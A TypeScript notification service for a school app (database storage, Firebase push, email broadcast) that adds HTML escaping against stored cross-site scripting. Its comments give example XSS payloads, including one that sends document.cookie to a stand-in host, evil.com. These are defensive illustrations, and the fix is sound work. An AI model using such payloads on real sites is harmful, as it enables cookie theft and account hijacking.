import { prisma } from '@/config/prisma.js';
import { firebase } from '@/config/firebase.js';
import { mailer } from '@/config/mailer.js';
import { AppError } from '@/utils/response.js';
import { NotificationType } from '@prisma/client';

// ── CWE-79/80: XSS Sanitization Utilities ────────────────────────────────

/**
 * ✅ CWE-79/80 Fix: Escapes HTML special characters.
 *
 * Attack without sanitization:
 *   input.title = "<script>document.cookie='stolen='+document.cookie</script>"
 *   → Stored in DB via createMany
 *   → Rendered in notification UI → XSS executes in victim's browser
 *
 *   input.body = "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
 *   → Sent via firebase.sendTopic → rendered in mobile webview → XSS
 *
 * Characters escaped:
 *   &  → &amp;   (must be first to avoid double-escaping)
 *   <  → &lt;    (closes script/tag injection)
 *   >  → &gt;    (closes tag injection)
 *   "  → &quot;  (closes attribute injection)
 *   '  → &#x27;  (closes single-quoted attribute injection)
 *   `  → &#x60;  (closes template literal injection)
 *   /  → &#x2F;  (helps close tags in some contexts)
 */
function escapeHtml(value: string): string {
  if (typeof value !== 'string') return '';

  return value
    .replace(/&/g,  '&amp;')    // ← Must be first
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;')
    .replace(/`/g,  '&#x60;')
    .replace(/\//g, '&#x2F;');
}

/**
 * ✅ CWE-79/80: Strips all HTML tags entirely.
 * Use for plain-text contexts (push notifications, SMS) where
 * HTML entities would appear literally and look wrong to users.
 *
 * Attack example:
 *   "Hello <b>world</b>" → push notification renders "<b>world</b>" literally
 *   With stripHtml: "Hello world" — clean plain text
 */
function stripHtml(value: string): string {
  if (typeof value !== 'string') return '';
  return value
    .replace(/<[^>]*>/g, '')      // Remove all HTML tags
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '') // Remove control chars
    .trim();
}

/**
 * ✅ CWE-79/80: Sanitizes notification content for storage and transmission.
 * Returns both HTML-safe (for email/web) and plain-text (for push) versions.
 */
function sanitizeNotificationContent(title: string, body: string): {
  safeTitle      : string;   // HTML-escaped — safe for web/email rendering
  safeBody       : string;   // HTML-escaped — safe for web/email rendering
  plainTitle     : string;   // Tags stripped — safe for push notifications
  plainBody      : string;   // Tags stripped — safe for push notifications
} {
  return {
    safeTitle  : escapeHtml(title),
    safeBody   : escapeHtml(body),
    plainTitle : stripHtml(title),
    plainBody  : stripHtml(body),
  };
}

// ── User Type Definitions ─────────────────────────────────────────────────

/**
 * ✅ TS7006 Fix (Lines 156, 176, 177): Explicit types for Prisma query results.
 * Replaces implicit `any` on `user` parameters in .map() and .filter() chains.
 */
interface BroadcastUser {
  id       : string;
  fullName : string;
  email    : string;
  settings : {
    notificationsEnabled : boolean | null;
    emailNotifications   : boolean | null;
    announcementPush     : boolean | null;
  } | null;
}

// ── Quiet-hours Guard ─────────────────────────────────────────────────────

async function isQuietHours(userId: string): Promise<boolean> {
  const settings = await prisma.userSettings.findUnique({ where: { userId } });
  if (!settings?.quietHoursEnabled) return false;

  const now     = new Date();
  const pad     = (n: number) => String(n).padStart(2, '0');
  const current = `${pad(now.getHours())}:${pad(now.getMinutes())}`;
  const { quietHoursStart: start, quietHoursEnd: end } = settings;

  // Handle overnight range e.g. 22:00 – 07:00
  if (start > end) return current >= start || current < end;
  return current >= start && current < end;
}

// ── Shared Push + Persist Helper (used by jobs) ───────────────────────────

export async function sendAndPersistNotification(
  userId  : string,
  title   : string,
  body    : string,
  type    : NotificationType,
  data?   : Record<string, string>,
): Promise<void> {
  // ✅ CWE-79/80: Sanitize before persisting to DB
  const { safeTitle, safeBody, plainTitle, plainBody } =
    sanitizeNotificationContent(title, body);

  await prisma.notification.create({
    data: {
      userId,
      title : safeTitle,   // HTML-safe for web notification rendering
      body  : safeBody,    // HTML-safe for web notification rendering
      type,
      data,
    },
  });

  if (await isQuietHours(userId)) return;

  const user = await prisma.user.findUnique({
    where  : { id: userId },
    select : {
      fcmToken : true,
      settings : { select: { pushNotifications: true } },
    },
  });

  if (user?.fcmToken && user.settings?.pushNotifications !== false) {
    // ✅ CWE-79/80: Plain text for push — no HTML entities in notifications
    await firebase.sendPush(user.fcmToken, plainTitle, plainBody, data);
  }
}

export function notificationTopic(
  scope : 'school' | 'department',
  id    : string,
): string {
  return `${scope}-${id}`.replace(/[^a-zA-Z0-9-_.~%]/g, '-');
}

// ── Service ───────────────────────────────────────────────────────────────

export const notificationsService = {

  async list(userId: string, page: number, limit: number) {
    const skip = (page - 1) * limit;
    const [items, total, unreadCount] = await Promise.all([
      prisma.notification.findMany({
        where   : { userId },
        orderBy : { createdAt: 'desc' },
        skip,
        take    : limit,
      }),
      prisma.notification.count({ where: { userId } }),
      prisma.notification.count({ where: { userId, isRead: false } }),
    ]);
    return { items, total, unreadCount, page, limit };
  },

  async markRead(id: string, userId: string) {
    const notif = await prisma.notification.findUnique({ where: { id } });
    if (!notif) throw new AppError('Notification not found', 404);
    if (notif.userId !== userId) throw new AppError('Not authorized', 403);
    return prisma.notification.update({
      where : { id },
      data  : { isRead: true, readAt: new Date() },
    });
  },

  async markAllRead(userId: string) {
    const { count } = await prisma.notification.updateMany({
      where : { userId, isRead: false },
      data  : { isRead: true, readAt: new Date() },
    });
    return { updated: count };
  },

  async delete(id: string, userId: string) {
    const notif = await prisma.notification.findUnique({ where: { id } });
    if (!notif) throw new AppError('Notification not found', 404);
    if (notif.userId !== userId) throw new AppError('Not authorized', 403);
    await prisma.notification.delete({ where: { id } });
    return { deleted: true };
  },

  async getSettings(userId: string) {
    return prisma.userSettings.upsert({
      where  : { userId },
      create : { userId },
      update : {},
    });
  },

  async updateSettings(
    userId : string,
    data   : Partial<{
      pushNotifications  : boolean;
      reminderPush       : boolean;
      eventPush          : boolean;
      whatsappOptIn      : boolean;
      announcementPush   : boolean;
      quietHoursEnabled  : boolean;
      quietHoursStart    : string;
      quietHoursEnd      : string;
      lowDataMode        : boolean;
      darkMode           : boolean;
    }>,
  ) {
    return prisma.userSettings.upsert({
      where  : { userId },
      create : { userId, ...data },
      update : data,
    });
  },

  async broadcastAnnouncement(input: {
    title        : string;
    body         : string;
    schoolId     : string;
    departmentId?: string | null;
    postId?      : string;
  }) {
    // ✅ CWE-79/80 Fix (Lines 159-160): Sanitize ALL user-controlled content
    // BEFORE storing in DB or sending via Firebase/email.
    //
    // Attack without sanitization:
    //   input.title = "<script>alert(document.cookie)</script>"
    //   → Stored raw in notification DB via createMany (line 159)
    //   → Sent raw via firebase.sendTopic (line 160)
    //   → Rendered in notification feed UI → stored XSS executes
    //   → Every user who loads notifications page is attacked
    const { safeTitle, safeBody, plainTitle, plainBody } =
      sanitizeNotificationContent(input.title, input.body);

    const where = {
      schoolId  : input.schoolId,
      isDeleted : false,
      ...(input.departmentId && { departmentId: input.departmentId }),
    };

    // ✅ TS7006 Fix (Line 156): Explicit BroadcastUser type on select result
    const users: BroadcastUser[] = await prisma.user.findMany({
      where,
      select: {
        id       : true,
        fullName : true,
        email    : true,
        settings : {
          select: {
            notificationsEnabled : true,
            emailNotifications   : true,
            announcementPush     : true,
          },
        },
      },
    });

    if (!users.length) return { recipients: 0 };

    // ✅ CWE-79/80: Store HTML-escaped content in DB
    // safeTitle/safeBody are safe for web notification rendering
    await prisma.notification.createMany({
      data: users.map((user: BroadcastUser) => ({   // ✅ TS7006 Fix (Line 156)
        userId : user.id,
        title  : safeTitle,    // ← HTML-escaped, was: input.title (raw)
        body   : safeBody,     // ← HTML-escaped, was: input.body (raw)
        type   : 'ANNOUNCEMENT' as NotificationType,
        data   : {
          type: 'ANNOUNCEMENT',
          ...(input.postId && { postId: input.postId }),
        },
      })),
    });

    const topic = input.departmentId
      ? notificationTopic('department', input.departmentId)
      : notificationTopic('school', input.schoolId);

    // ✅ CWE-79/80: Plain text for push notifications — no HTML entities
    // Firebase push renders in OS notification center — HTML would show literally
    await firebase.sendTopic(topic, plainTitle, plainBody, {
      type: 'ANNOUNCEMENT',
      ...(input.postId && { postId: input.postId }),
    });

    // ✅ TS7006 Fix (Lines 176-177): Explicit BroadcastUser type in filter+map
    // ✅ CWE-79/80: escapeHtml applied to fullName, safeTitle, safeBody for email HTML
    await Promise.all(
      users
        .filter((user: BroadcastUser) =>              // ✅ TS7006 Fix (Line 176)
          user.settings?.notificationsEnabled !== false &&
          user.settings?.emailNotifications   !== false
        )
        .map((user: BroadcastUser) =>                 // ✅ TS7006 Fix (Line 177)
          mailer
            .sendAnnouncement(
              user.email,
              escapeHtml(user.fullName),  // ✅ CWE-79/80: user data in email HTML
              safeTitle,                  // ✅ Already HTML-escaped above
              safeBody,                   // ✅ Already HTML-escaped above
            )
            .catch(() => null)
        )
    );

    return { recipients: users.length, topic };
  },
};